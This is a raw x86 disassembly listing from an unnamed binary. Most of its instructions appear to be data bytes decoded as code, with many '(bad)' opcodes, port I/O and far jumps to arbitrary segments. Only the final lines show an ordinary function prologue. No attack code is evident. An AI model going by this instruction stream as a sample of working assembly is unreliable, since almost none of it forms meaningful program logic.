  420cf1:	jbe    0x420d4b
  420cf3:	(bad)  [esi]
  420cf5:	cmp    BYTE PTR [esi+esi*4],cl
  420cf8:	inc    ebp
  420cf9:	pusha  
  420cfa:	mov    eax,ds:0x1368d501
  420cff:	aas    
  420d00:	push   eax
  420d01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d02:	push   esi
  420d03:	in     eax,0xb9
  420d05:	dec    ecx
  420d06:	mov    ebx,0x6cbcccc2
  420d0b:	cmp    BYTE PTR [edi+edx*4-0x79],bh
  420d0f:	dec    DWORD PTR [ecx]
  420d11:	mov    bh,0xd9
  420d13:	mov    dl,0x8b
  420d15:	inc    esi
  420d16:	sbb    BYTE PTR [eax+ebx*4+0x76],al
  420d1a:	enter  0x2ba7,0xe4
  420d1e:	jbe    0x420cd8
  420d20:	(bad)  
  420d21:	sar    edi,1
  420d23:	aaa    
  420d24:	jb     0x420cd4
  420d26:	inc    esi
  420d27:	in     eax,0x45
  420d29:	dec    ebp
  420d2a:	dec    ebp
  420d2b:	sub    DWORD PTR [edi],0x581e8cb8
  420d31:	fs and eax,ebp
  420d34:	add    eax,0x1543411b
  420d39:	push   0xbea6e674
  420d3e:	das    
  420d3f:	mov    bl,0x35
  420d41:	pop    edx
  420d42:	scas   eax,DWORD PTR es:[edi]
  420d43:	js     0x420d89
  420d45:	out    0xf4,eax
  420d47:	inc    eax
  420d48:	fdivr  DWORD PTR [ecx+0x6810eca2]
  420d4e:	adc    al,0xe
  420d50:	iret   
  420d51:	into   
  420d52:	cmc    
  420d53:	mov    ah,0x8c
  420d55:	neg    DWORD PTR [ecx+0x27]
  420d58:	sub    al,0xd8
  420d5a:	loopne 0x420d18
  420d5c:	std    
  420d5d:	pop    ds
  420d5e:	cmp    dl,bh
  420d60:	iret   
  420d61:	fistp  DWORD PTR [ebx]
  420d63:	mov    dl,0x40
  420d65:	inc    eax
  420d66:	sti    
  420d67:	lahf   
  420d68:	dec    esp
  420d69:	pop    esp
  420d6a:	lods   al,BYTE PTR ds:[esi]
  420d6b:	adc    al,0x9d
  420d6d:	lea    esp,[ebx+0x1a]
  420d70:	push   edi
  420d71:	adc    eax,0x13e0d33a
  420d76:	mov    BYTE PTR [ecx],al
  420d78:	mov    ch,0x52
  420d7a:	das    
  420d7b:	push   ecx
  420d7c:	ret    0x93f0
  420d7f:	sbb    eax,0x17dfa31e
  420d84:	push   ebp
  420d85:	call   DWORD PTR [ecx+0x4ca14b87]
  420d8b:	rcr    DWORD PTR [edi+0x1f],0x7b
  420d8f:	bound  edx,QWORD PTR [eax+0x447f6698]
  420d95:	mov    al,0x34
  420d97:	pop    esi
  420d98:	adc    bh,bh
  420d9a:	mov    ds:0x468af8ad,al
  420d9f:	ja     0x420d29
  420da1:	xchg   BYTE PTR ds:0xce742ade,bh
  420da7:	mov    ds:0x56efa9f9,eax
  420dac:	in     eax,dx
  420dad:	fdiv   DWORD PTR [edx+0x6ebec10a]
  420db3:	dec    edi
  420db4:	push   ebp
  420db5:	inc    edi
  420db6:	cmc    
  420db7:	lods   eax,DWORD PTR ds:[esi]
  420db8:	cdq    
  420db9:	fst    QWORD PTR [ecx+0x3beb993a]
  420dbf:	test   esp,ebp
  420dc1:	pop    ecx
  420dc2:	lods   al,BYTE PTR ds:[esi]
  420dc3:	dec    esi
  420dc4:	push   es
  420dc5:	sbb    ecx,edi
  420dc7:	add    eax,0x80e25947
  420dcc:	mov    ch,BYTE PTR [ebx]
  420dce:	and    DWORD PTR [ecx+edi*4+0x3],ebx
  420dd2:	les    ebp,FWORD PTR [ebp+0x65]
  420dd5:	add    BYTE PTR [ebx],al
  420dd7:	inc    esi
  420dd8:	or     ebx,DWORD PTR [edi]
  420dda:	dec    edi
  420ddb:	adc    eax,0x46ed98bc
  420de0:	mov    eax,0xc1846bb8
  420de5:	dec    esi
  420de6:	call   0x851d:0x4c0b91f8
  420ded:	ja     0x420d87
  420def:	dec    edi
  420df0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420df1:	mov    DWORD PTR [ebx+0x4a8dc984],edi
  420df7:	mov    BYTE PTR [ebx-0x27],dh
  420dfa:	and    bl,dl
  420dfc:	xlat   BYTE PTR ds:[ebx]
  420dfd:	gs pop es
  420dff:	lock mov ah,0xf5
  420e02:	mov    eax,0x40163fd1
  420e07:	push   esp
  420e08:	js     0x420db6
  420e0a:	aaa    
  420e0b:	cmp    DWORD PTR [ecx],esp
  420e0d:	mov    ebx,0x159aefcc
  420e12:	(bad)  
  420e14:	sbb    bl,BYTE PTR [ecx+0x10b19851]
  420e1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e1b:	sub    eax,0x6bcb2643
  420e20:	ja     0x420e0e
  420e22:	mov    ss,WORD PTR [ecx]
  420e24:	or     BYTE PTR [edi],dh
  420e26:	push   0xd4c6cc0d
  420e2b:	pop    ss
  420e2c:	xchg   edi,eax
  420e2d:	loopne 0x420e13
  420e2f:	adc    bh,ah
  420e31:	out    dx,al
  420e32:	int3   
  420e33:	add    al,BYTE PTR [ecx-0x6cc8fc41]
  420e39:	push   esi
  420e3a:	jo     0x420e96
  420e3c:	sbb    BYTE PTR [ecx+0x739efb37],ch
  420e42:	jno    0x420e12
  420e44:	addr16 std 
  420e46:	shl    DWORD PTR [edi+ebx*2-0x49],0x49
  420e4b:	sub    DWORD PTR [edi+0x14],eax
  420e4e:	inc    edi
  420e4f:	mov    al,ds:0x2ce5f3f2
  420e54:	test   eax,0x824f1024
  420e59:	dec    ecx
  420e5a:	mov    ebp,0xa60e3dba
  420e5f:	stc    
  420e60:	jnp    0x420e56
  420e62:	sub    al,0x6e
  420e64:	out    dx,al
  420e65:	xchg   edx,eax
  420e66:	and    al,bh
  420e68:	test   DWORD PTR [ebx],edi
  420e6a:	daa    
  420e6b:	pushf  
  420e6c:	fs stos DWORD PTR es:[edi],eax
  420e6e:	fsubr  QWORD PTR [ebp+0x4f]
  420e71:	jmp    0x702dd5d2
  420e76:	mov    ecx,0xe4b2704c
  420e7b:	(bad)  
  420e7c:	mov    eax,ds:0xc59ee592
  420e81:	ret    0x7a5c
  420e84:	js     0x420e52
  420e86:	(bad)  
  420e87:	cdq    
  420e88:	mov    WORD PTR [eax+0x570bc4e5],cs
  420e8e:	add    ebp,ebx
  420e90:	shl    DWORD PTR [eax],cl
  420e92:	sbb    BYTE PTR [ecx-0x28],dh
  420e95:	ret    0xea78
  420e98:	adc    ah,BYTE PTR [ebp+0x15ac2ec4]
  420e9e:	fisubr DWORD PTR [esi+0x4c2bbf2a]
  420ea4:	jecxz  0x420ead
  420ea6:	pop    ss
  420ea7:	or     esi,DWORD PTR [edi]
  420ea9:	jae    0x420e7b
  420eab:	jo     0x420e30
  420ead:	and    BYTE PTR [ebx],bh
  420eaf:	mov    dh,0xb7
  420eb1:	adc    DWORD PTR [edx-0x1f],ebx
  420eb4:	pop    es
  420eb5:	jg     0x420f28
  420eb7:	inc    ecx
  420eb8:	pusha  
  420eb9:	dec    edx
  420eba:	cli    
  420ebb:	ins    BYTE PTR es:[edi],dx
  420ebc:	mov    ds:0xa80b814f,eax
  420ec1:	iret   
  420ec2:	out    0xb3,al
  420ec4:	push   cs
  420ec5:	sub    al,0xc4
  420ec7:	push   ebx
  420ec8:	ds add dh,al
  420ecb:	(bad)  
  420ecc:	retf   0xc62c
  420ecf:	push   0x3a77af31
  420ed4:	mov    esi,0xaf980888
  420ed9:	es mov eax,0x2037e4d4
  420edf:	mov    bh,0xce
  420ee1:	adc    BYTE PTR [esi+0x42],dh
  420ee4:	(bad)  
  420ee5:	push   ebx
  420ee6:	jmp    0x95040184
  420eeb:	(bad)  
  420eec:	mov    eax,0xbf576601
  420ef1:	sbb    DWORD PTR [ebx],0x59
  420ef4:	mov    ebx,0x4112e49f
  420ef9:	add    dl,BYTE PTR [eax]
  420efb:	pop    ds
  420efc:	jne    0x420ef9
  420efe:	xchg   esi,eax
  420eff:	jnp    0x420f7a
  420f01:	cdq    
  420f02:	retf   0xcee3
  420f05:	int3   
  420f06:	mov    BYTE PTR [ecx-0x300f3021],dh
  420f0c:	ins    BYTE PTR es:[edi],dx
  420f0d:	jmp    0xf386:0x5f1c1b9c
  420f14:	xchg   esp,eax
  420f15:	cmp    DWORD PTR [ebx],ebx
  420f17:	cmp    al,0x26
  420f19:	sbb    al,0x16
  420f1b:	mov    cl,0x8b
  420f1d:	adc    eax,0xbcb157d3
  420f22:	aad    0x97
  420f24:	cli    
  420f25:	call   ebp
  420f27:	add    BYTE PTR [eax-0x91caa8e],al
  420f2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f2e:	xchg   BYTE PTR [edx-0x36da54db],bh
  420f34:	cdq    
  420f35:	aaa    
  420f36:	inc    edx
  420f37:	pop    ds
  420f38:	jg     0x420f79
  420f3a:	mov    edi,0xdb7e3cc6
  420f3f:	faddp  st(3),st
  420f41:	pop    esi
  420f42:	in     al,0x33
  420f44:	jae    0x420f11
  420f46:	mov    dh,0x43
  420f48:	sub    eax,0x6a69c830
  420f4d:	sub    eax,0xad525875
  420f52:	aas    
  420f53:	jge    0x420f60
  420f55:	aas    
  420f56:	call   0xd051:0x6c11a0b1
  420f5d:	js     0x420f26
  420f5f:	nop
  420f60:	int3   
  420f61:	adc    eax,0x8e79f18a
  420f66:	mov    bh,cl
  420f68:	and    DWORD PTR [ebx+edi*8],esi
  420f6b:	(bad)  
  420f6c:	(bad)  
  420f6d:	mov    eax,0xb77adef6
  420f72:	jns    0x420f0b
  420f74:	ret    
  420f75:	jb     0x420fcd
  420f77:	shr    DWORD PTR [eax+eax*8],cl
  420f7a:	iret   
  420f7b:	push   0xa7063794
  420f80:	adc    BYTE PTR [eax+0x5f],bl
  420f83:	call   0x42edaed7
  420f88:	loopne 0x420ff6
  420f8a:	cmp    eax,0x7f5ff621
  420f8f:	xchg   ebx,eax
  420f90:	retf   0x5649
  420f93:	test   DWORD PTR [edi],ebp
  420f95:	or     al,0xba
  420f97:	cmp    WORD PTR [edi-0x40],ax
  420f9b:	fstp   TBYTE PTR [eax]
  420f9d:	mov    edx,0x5b725966
  420fa2:	sub    bh,BYTE PTR [ebx-0x17]
  420fa5:	sbb    al,0xb7
  420fa7:	das    
  420fa8:	cmc    
  420fa9:	pop    ebp
  420faa:	je     0x421000
  420fac:	lods   al,BYTE PTR ds:[esi]
  420fad:	inc    eax
  420fae:	fs jns 0x420f9d
  420fb1:	mov    bl,0x72
  420fb3:	pushf  
  420fb4:	and    BYTE PTR [edx],ah
  420fb6:	test   DWORD PTR [ebx+0x3fd60a79],esp
  420fbc:	pop    ss
  420fbd:	pop    ebx
  420fbe:	pop    ecx
  420fbf:	clc    
  420fc0:	push   ebp
  420fc1:	cmc    
  420fc2:	pop    ss
  420fc3:	(bad)
  420fc7:	shl    BYTE PTR [esi-0x33],1
  420fca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420fcb:	daa    
  420fcc:	mov    edi,0x588f2299
  420fd1:	in     al,dx
  420fd2:	xor    al,0xc
  420fd4:	mov    eax,0xd9956113
  420fd9:	or     BYTE PTR [ecx-0x1aa03524],bh
  420fdf:	push   0x16e5673d
  420fe4:	test   DWORD PTR [eax-0x494a5067],esi
  420fea:	pop    edi
  420feb:	add    al,0xac
  420fed:	jle    0x420f81
  420fef:	arpl   WORD PTR [esi],ax
  420ff1:	sub    al,0xa1
  420ff3:	cmp    DWORD PTR ds:0x9d179caf,esp
  420ff9:	push   cs
  420ffa:	dec    esp
  420ffb:	mov    eax,ds:0xc689e3cb
  421000:	push   cs
  421001:	scas   eax,DWORD PTR es:[edi]
  421002:	jmp    0x75c5:0x26894195
  421009:	or     al,0xc
  42100b:	js     0x42108c
  42100d:	dec    ebx
  42100e:	(bad)  [esp+eax*4-0x646d4825]
  421015:	jnp    0x420fc0
  421017:	sahf   
  421018:	inc    ebx
  421019:	sbb    cl,ah
  42101b:	ss xchg edx,eax
  42101d:	xchg   ebx,eax
  42101e:	sbb    eax,0x1986e8ec
  421023:	cmp    BYTE PTR [edi+0x1f5f6531],bh
  421029:	jecxz  0x4210a1
  42102b:	jmp    0xb0e6be46
  421030:	cmp    cl,BYTE PTR [eax-0x4a8846d6]
  421036:	xchg   edx,eax
  421037:	pop    esp
  421038:	xlat   BYTE PTR ss:[ebx]
  42103a:	or     edx,DWORD PTR [ebp+0x70008148]
  421040:	pop    ebx
  421041:	sbb    bh,al
  421043:	and    DWORD PTR [eax+0x3e],edi
  421046:	add    al,0xd0
  421048:	cmp    dh,BYTE PTR [ecx-0x2ee8ce98]
  42104e:	or     ebp,edi
  421050:	jne    0x421080
  421052:	or     dl,BYTE PTR [ebx-0x76da594e]
  421058:	mov    edi,DWORD PTR [eax-0x1f7f1358]
  42105e:	dec    ecx
  42105f:	sbb    DWORD PTR [ebp+0x2247511c],eax
  421065:	xchg   esp,eax
  421066:	scas   al,BYTE PTR es:[edi]
  421067:	push   eax
  421068:	cmp    al,0x19
  42106a:	das    
  42106b:	xchg   DWORD PTR [ebx-0x5e],edx
  42106e:	ins    DWORD PTR es:[edi],dx
  42106f:	data16 or bh,BYTE PTR [eax+0x72]
  421073:	sub    BYTE PTR [ebx-0x550bc601],ah
  421079:	adc    al,0x94
  42107b:	fbld   TBYTE PTR ds:0x4093cf3a
  421081:	dec    esp
  421082:	sbb    eax,DWORD PTR [ecx]
  421084:	mov    BYTE PTR [eax-0x5a3c4ba9],al
  42108a:	fist   WORD PTR [ecx]
  42108c:	inc    esp
  42108d:	pop    DWORD PTR [edx+0x6c]
  421090:	push   esi
  421091:	mov    bl,0x34
  421093:	outs   dx,DWORD PTR ds:[esi]
  421094:	pop    esp
  421095:	out    0xe,al
  421097:	adc    esi,ebx
  421099:	jno    0x4210b2
  42109b:	fs pop esi
  42109d:	fnstenv [esi-0x7a2378a1]
  4210a3:	das    
  4210a4:	call   0x71cb96ef
  4210a9:	shl    dl,cl
  4210ab:	into   
  4210ac:	loop   0x421041
  4210ae:	out    0xe6,eax
  4210b0:	test   eax,0xb173f8c5
  4210b5:	mov    bl,0xc1
  4210b7:	iret   
  4210b8:	xor    al,0x2e
  4210ba:	daa    
  4210bb:	jae    0x421083
  4210bd:	and    ebx,DWORD PTR [ebx-0x2e1bb7ff]
  4210c3:	mov    dl,0x9a
  4210c5:	xchg   ebx,eax
  4210c6:	mov    bl,BYTE PTR [edi+esi*1-0x4d]
  4210ca:	sub    ah,BYTE PTR [eax-0x30]
  4210cd:	clc    
  4210ce:	pop    edx
  4210cf:	les    eax,FWORD PTR [eax]
  4210d1:	inc    ecx
  4210d2:	lahf   
  4210d3:	ja     0x42107e
  4210d5:	test   BYTE PTR [eax],0xf9
  4210d8:	retf   0xeec8
  4210db:	sbb    eax,0x3a84ed34
  4210e0:	xchg   ebp,eax
  4210e1:	call   0x1073:0x306c0b0
  4210e8:	mov    ebp,0x5c277bf5
  4210ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210ee:	inc    esp
  4210ef:	mov    esi,0x2ef0d241
  4210f4:	mov    bl,0x27
  4210f6:	stc    
  4210f7:	scas   eax,DWORD PTR es:[edi]
  4210f8:	(bad)  
  4210f9:	imul   edi,DWORD PTR [edi-0x219616ee],0x28688eac
  421103:	into   
  421104:	test   DWORD PTR [edx],esp
  421106:	and    BYTE PTR [edx+0x7c],bh
  421109:	xchg   BYTE PTR [edi-0x7a8c2627],dh
  42110f:	(bad)  
  421110:	(bad)  
  421111:	cwde   
  421112:	mov    ebp,0x5bd30481
  421117:	xor    dh,BYTE PTR [eax-0x4]
  42111a:	cld    
  42111b:	inc    edx
  42111c:	and    eax,0xdb06c924
  421121:	daa    
  421122:	(bad)  
  421123:	inc    ecx
  421124:	pop    ds
  421125:	inc    esp
  421126:	and    eax,DWORD PTR [edi-0x77ee0225]
  42112c:	and    DWORD PTR [ebp-0x59e2b536],eax
  421132:	mov    edx,0x80e3f8b6
  421137:	xchg   ebx,eax
  421138:	pop    edx
  421139:	sbb    ecx,DWORD PTR [edi-0x278b8d62]
  42113f:	in     al,dx
  421140:	sahf   
  421141:	inc    esp
  421142:	add    BYTE PTR [edi-0x43853653],bh
  421148:	add    BYTE PTR [ebp-0x30],al
  42114b:	inc    esp
  42114c:	adc    eax,0x9fed4aaf
  421151:	mov    dl,0xa2
  421153:	xchg   edi,eax
  421154:	mov    al,ds:0x8d503175
  421159:	mov    ebp,0xe2599730
  42115e:	ins    DWORD PTR es:[edi],dx
  42115f:	lea    edi,cs:[esi-0x78]
  421163:	pusha  
  421164:	mov    cl,0x6b
  421166:	jno    0x4211a8
  421168:	jbe    0x421143
  42116a:	out    0xe4,eax
  42116c:	cdq    
  42116d:	imul   ecx,DWORD PTR es:[eax-0x23213db],0x23
  421175:	jl     0x42113f
  421177:	out    dx,eax
  421178:	mov    al,0x23
  42117a:	scas   eax,DWORD PTR es:[edi]
  42117b:	fdivrp st(6),st
  42117d:	cs push esi
  42117f:	enter  0x1699,0xe9
  421183:	mov    ebx,0x367c8ce4
  421188:	mov    edi,0xdec2433
  42118d:	ins    DWORD PTR es:[edi],dx
  42118e:	bound  ecx,QWORD PTR ss:[eax-0x7d9e830b]
  421195:	lock mov ebx,0xad01fd0d
  42119b:	lods   eax,DWORD PTR ds:[esi]
  42119c:	cmp    edi,DWORD PTR [ebx+0x2f8f94f8]
  4211a2:	aam    0x99
  4211a4:	nop
  4211a5:	add    ah,BYTE PTR [eax-0x6edba77]
  4211ab:	jo     0x4211cc
  4211ad:	inc    ecx
  4211ae:	and    al,0x94
  4211b0:	push   0x6d79f19c
  4211b5:	lods   al,BYTE PTR ds:[esi]
  4211b6:	pop    eax
  4211b7:	dec    BYTE PTR [ebx]
  4211b9:	pop    edi
  4211ba:	add    DWORD PTR [edx-0x3],ecx
  4211bd:	jbe    0x42114a
  4211bf:	sahf   
  4211c0:	push   edx
  4211c1:	xor    BYTE PTR ss:[edi+eiz*8+0x69d8d58c],dh
  4211c9:	push   esp
  4211ca:	in     al,dx
  4211cb:	popf   
  4211cc:	add    al,0x91
  4211ce:	cmp    edx,esi
  4211d0:	mov    es,WORD PTR [edx]
  4211d2:	jle    0x421233
  4211d4:	ret    
  4211d5:	stos   DWORD PTR es:[edi],eax
  4211d6:	je     0x4211fb
  4211d8:	sbb    al,0x1b
  4211da:	leave  
  4211db:	add    edi,DWORD PTR [esi]
  4211dd:	mov    edi,0x365a3aed
  4211e2:	ins    DWORD PTR es:[edi],dx
  4211e3:	jmp    0x95e2:0x1f094f79
  4211ea:	or     dl,al
  4211ec:	push   esp
  4211ed:	cmp    ah,dl
  4211ef:	bound  ecx,QWORD PTR [edi+0x50]
  4211f2:	xchg   esi,eax
  4211f3:	cmp    eax,0x2cbe1653
  4211f8:	xor    al,0x11
  4211fa:	and    esi,0xdc64921c
  421200:	fstp   QWORD PTR [esi+0x28]
  421203:	dec    edx
  421204:	sbb    cl,al
  421206:	cmc    
  421207:	xor    esp,DWORD PTR [ecx+0x0]
  42120a:	adc    ch,BYTE PTR [edi]
  42120c:	mov    DWORD PTR [eax],ecx
  42120e:	mov    ebx,DWORD PTR [ecx+0x6d]
  421211:	ja     0x4211f3
  421213:	xchg   edi,eax
  421214:	rol    dh,1
  421216:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421217:	lahf   
  421218:	add    al,0xd8
  42121a:	mov    ch,0x72
  42121c:	addr16 cmc 
  42121e:	data16 mov ch,0xec
  421221:	or     eax,0x8deb8ccf
  421226:	mov    ch,0x63
  421228:	fs out 0xda,eax
  42122b:	inc    esp
  42122c:	fst    DWORD PTR [esi-0x57e49c2f]
  421232:	jne    0x421213
  421234:	test   al,0xc4
  421237:	cmp    DWORD PTR [edi],ebx
  421239:	rol    BYTE PTR [eax],0x6c
  42123c:	leave  
  42123d:	data16 int3 
  42123f:	or     BYTE PTR [ebp+0x6b036e6],cl
  421245:	pop    esp
  421246:	pop    esi
  421247:	(bad)  
  421248:	shl    BYTE PTR [ecx-0xd464d1],1
  42124e:	mov    ebp,DWORD PTR [ecx]
  421250:	std    
  421251:	in     al,0xc9
  421253:	clc    
  421254:	jmp    0xed4d:0xced08e2f
  42125b:	xor    DWORD PTR [esp+ecx*4+0xc07f3a7],esp
  421262:	mov    ebx,0xd9422c5
  421267:	sbb    bl,BYTE PTR [ebx+0x53f58125]
  42126d:	jmp    0x3393:0x5be0cc85
  421274:	in     eax,0x5b
  421276:	stos   BYTE PTR es:[edi],al
  421277:	loop   0x4211fc
  421279:	pop    ebp
  42127a:	pop    esi
  42127b:	add    esi,DWORD PTR [ecx-0x158c231c]
  421281:	dec    ecx
  421282:	lds    ebx,FWORD PTR [edx]
  421284:	es cmp eax,0x7faeea42
  42128a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42128b:	mov    ds:0xb8f8ea26,al
  421290:	or     esp,DWORD PTR [ecx+0x73]
  421293:	xor    DWORD PTR [edx+0x1c789791],edi
  421299:	cli    
  42129a:	cmp    al,0x2b
  42129c:	push   edi
  42129d:	adc    bl,BYTE PTR [ebx]
  42129f:	pop    ebp
  4212a0:	add    eax,0x15ccf3bc
  4212a5:	mov    bl,BYTE PTR [esi+0x7ef81789]
  4212ab:	pop    ax
  4212ad:	mov    ebp,0xb7dda6e6
  4212b2:	mov    al,ds:0xa74de15f
  4212b7:	outs   dx,BYTE PTR ds:[esi]
  4212b8:	cdq    
  4212b9:	push   ss
  4212ba:	loop   0x4212c4
  4212bc:	outs   dx,DWORD PTR ds:[esi]
  4212bd:	addr16 aad 0x15
  4212c0:	push   0xa1f46faf
  4212c5:	pop    esp
  4212c6:	(bad)  
  4212c8:	out    0xf9,al
  4212ca:	add    ah,BYTE PTR [ebp+0x6104ff26]
  4212d0:	mov    cl,0xb3
  4212d2:	sbb    DWORD PTR [eax+0x33],ebp
  4212d5:	mov    dh,0xa1
  4212d7:	repz mov ebx,0x82e3bfce
  4212dd:	lds    eax,FWORD PTR [eax]
  4212df:	xchg   edi,eax
  4212e0:	push   0x34
  4212e2:	jnp    0x42126a
  4212e4:	out    dx,eax
  4212e5:	sub    ah,BYTE PTR [esi]
  4212e7:	inc    edx
  4212e8:	add    al,0x64
  4212ea:	fdivr  DWORD PTR [ebp-0x547bb2af]
  4212f0:	loopne 0x42130d
  4212f2:	out    dx,eax
  4212f3:	inc    eax
  4212f4:	sub    esi,DWORD PTR [esi+0x42]
  4212f7:	retf   
  4212f8:	mov    bl,0x9
  4212fa:	mov    ch,0x90
  4212fc:	in     eax,dx
  4212fd:	add    eax,0xee6c256c
  421302:	(bad)  
  421303:	pop    edx
  421304:	xchg   edx,eax
  421305:	or     BYTE PTR [edi],dl
  421307:	pop    edx
  421308:	xor    al,0xc6
  42130a:	aad    0xa4
  42130c:	xor    al,0xbe
  42130e:	fldcw  WORD PTR [eax]
  421310:	aad    0x9d
  421312:	fstp   QWORD PTR [ebp-0x5d6be8e9]
  421318:	push   ebp
  421319:	sbb    al,0xf
  42131b:	cli    
  42131c:	or     al,0x49
  42131e:	rcl    bl,1
  421320:	test   DWORD PTR [edi],ebp
  421322:	adc    al,0xf8
  421324:	shr    BYTE PTR [edi+0x47],0xbc
  421328:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421329:	sub    DWORD PTR [edx],ecx
  42132b:	pop    ds
  42132c:	leave  
  42132d:	adc    DWORD PTR [ebp-0x31],ebx
  421330:	inc    eax
  421331:	jo     0x421313
  421333:	xchg   ecx,eax
  421334:	aam    0xb5
  421336:	adc    BYTE PTR [esi-0x7e0271f0],bh
  42133c:	jbe    0x4212d0
  42133e:	jmp    0xeb1e9ea9
  421343:	xchg   esp,eax
  421344:	in     eax,0x26
  421346:	sti    
  421347:	cld    
  421348:	sub    edi,DWORD PTR [eax+0x7afe8101]
  42134e:	cmp    al,0x9d
  421350:	fdivr  QWORD PTR [eax]
  421352:	loop   0x42132e
  421354:	mov    al,BYTE PTR [ecx]
  421356:	jmp    0x4213bc
  421358:	pop    esp
  421359:	mov    al,0x8f
  42135b:	and    eax,0x5a9d8777
  421360:	mov    eax,0xd112f9d1
  421365:	mov    al,ds:0xb0f62b29
  42136a:	inc    ecx
  42136b:	mov    ch,0xa7
  42136d:	sbb    esp,DWORD PTR [esi]
  42136f:	aad    0x48
  421371:	xor    BYTE PTR [eax+0x1e2e034d],ah
  421377:	cmp    ecx,DWORD PTR [edx-0x6f]
  42137a:	lods   eax,DWORD PTR ds:[esi]
  42137b:	mov    edi,0x3119db1
  421380:	pop    edx
  421381:	fstp   DWORD PTR [esi]
  421383:	mov    dh,0xa
  421385:	xor    cl,0x5e
  421388:	mov    bh,cl
  42138a:	out    0x8d,eax
  42138c:	pop    ebp
  42138d:	pop    ebp
  42138e:	sbb    bh,BYTE PTR [eax]
  421390:	ret    0x7078
  421393:	fmul   DWORD PTR [eax-0x10]
  421396:	int    0x95
  421398:	push   es
  421399:	push   ds
  42139a:	(bad)  
  42139b:	not    bl
  42139d:	call   0x5a05:0x4b50c52b
  4213a4:	scas   al,BYTE PTR es:[edi]
  4213a5:	repnz mov esi,0x2911fd93
  4213ab:	adc    al,0x29
  4213ad:	and    esi,esp
  4213af:	push   ecx
  4213b0:	and    BYTE PTR [esi+0x47],dl
  4213b3:	mov    ds:0x112d3caf,al
  4213b8:	or     esp,DWORD PTR [esi]
  4213ba:	cmp    ebp,DWORD PTR [ecx+0x8]
  4213bd:	in     al,0xec
  4213bf:	pushfw 
  4213c1:	outs   dx,DWORD PTR ds:[esi]
  4213c2:	push   edx
  4213c3:	daa    
  4213c4:	cld    
  4213c5:	dec    sp
  4213c7:	lods   eax,DWORD PTR ds:[esi]
  4213c8:	push   es
  4213c9:	dec    ebx
  4213ca:	adc    eax,0xaba3ec9e
  4213cf:	pop    ebp
  4213d0:	(bad)  
  4213d2:	and    ch,bl
  4213d4:	sbb    ebp,esp
  4213d6:	mov    edi,0xb31ec69e
  4213db:	(bad)  
  4213dc:	gs ret 0x7b47
  4213e0:	xor    al,BYTE PTR ds:0xaabd3127
  4213e6:	mov    esp,0xc58fbb4a
  4213eb:	loopne 0x421416
  4213ed:	dec    ecx
  4213ee:	inc    edi
  4213ef:	mov    esi,0xb312f7ca
  4213f4:	data16 cmp ah,BYTE PTR ds:[eax-0x3c]
  4213f9:	xchg   ebp,eax
  4213fa:	ins    BYTE PTR es:[edi],dx
  4213fb:	in     eax,0x2c
  4213fd:	sbb    esi,DWORD PTR [eax+0x7b60ab37]
  421403:	mov    dl,0x45
  421405:	enter  0x682e,0xed
  421409:	mov    BYTE PTR [edi-0x1526d9c6],bh
  42140f:	fucomp st(7)
  421411:	mov    edx,0xb82a037e
  421416:	mov    ecx,0xee7ed705
  42141b:	or     DWORD PTR [ecx],ebp
  42141d:	out    0xf2,eax
  42141f:	adc    DWORD PTR ds:0xfbc5f9ab,eax
  421425:	out    0xaa,eax
  421427:	pop    ebx
  421428:	lock inc edi
  42142a:	or     al,0x38
  42142c:	sbb    BYTE PTR [edi],bh
  42142e:	jmp    DWORD PTR [ecx+0x3b]
  421431:	push   ecx
  421432:	xchg   ebx,eax
  421433:	out    0x7b,al
  421435:	cmp    eax,0x9ef8d48e
  42143a:	xor    BYTE PTR [esi-0x42],bh
  42143d:	adc    cl,cl
  42143f:	push   0x15
  421441:	pop    edi
  421442:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421443:	mov    ch,0x1b
  421445:	add    ecx,DWORD PTR [edx-0x3cde331f]
  42144b:	sti    
  42144c:	mov    eax,0x364822ab
  421451:	jno    0x421423
  421453:	out    dx,eax
  421454:	loopne 0x42149c
  421456:	add    dl,bl
  421458:	adc    al,0xba
  42145a:	cdq    
  42145b:	dec    eax
  42145c:	fwait
  42145d:	repnz cwde 
  42145f:	or     DWORD PTR [eax],edi
  421461:	fxch   st(3)
  421463:	mov    al,ds:0xc889a7
  421468:	push   ebx
  421469:	xor    DWORD PTR [eax-0x18f6cb5e],0xffffffa3
  421470:	inc    ebx
  421471:	cmp    BYTE PTR [edi+edi*8-0x78],bl
  421475:	aas    
  421476:	pusha  
  421477:	icebp  
  421478:	pop    ss
  421479:	imul   edi,DWORD PTR [ebx+ecx*8],0xb46eca2
  421480:	sub    eax,0x77db207b
  421485:	je     0x42140b
  421487:	jns    0x4214f5
  421489:	lock sub edi,0x79
  42148d:	adc    DWORD PTR [eax-0x24cd2ebb],ebp
  421493:	clc    
  421494:	adc    BYTE PTR [ebx+0x72f0becf],0xb8
  42149b:	(bad)  
  42149c:	js     0x4214f4
  42149e:	loopne 0x42151b
  4214a0:	push   edi
  4214a1:	retf   
  4214a2:	pop    esi
  4214a3:	push   edi
  4214a4:	and    bl,dh
  4214a6:	dec    esi
  4214a7:	es adc al,0xb6
  4214aa:	fwait
  4214ab:	mov    edx,0xadaf0227
  4214b0:	xor    ch,dh
  4214b2:	adc    eax,0x31545d23
  4214b7:	jmp    0x9536daf
  4214bc:	stc    
  4214bd:	mov    ah,BYTE PTR [edi]
  4214bf:	and    eax,0x3c40029c
  4214c4:	arpl   WORD PTR [eax+0x338ac84e],ax
  4214ca:	rol    bl,0x90
  4214cd:	nop
  4214ce:	nop
  4214cf:	nop
  4214d0:	push   ecx
  4214d1:	push   ebp
  4214d2:	mov    ebp,DWORD PTR [esp+0x10]
  4214d6:	xor    eax,eax
  4214d8:	test   ebp,ebp
  4214da:	push   esi
  4214db:	mov    DWORD PTR [esp+0x8],eax
  4214df:	mov    esi,0xfffffffd
  4214e4:	je     0x421546
  4214e6:	push   ebx
  4214e7:	push   edi
  4214e8:	mov    edi,DWORD PTR [esp+0x18]
  4214ec:	mov    DWORD PTR [esp+0x1c],0x1
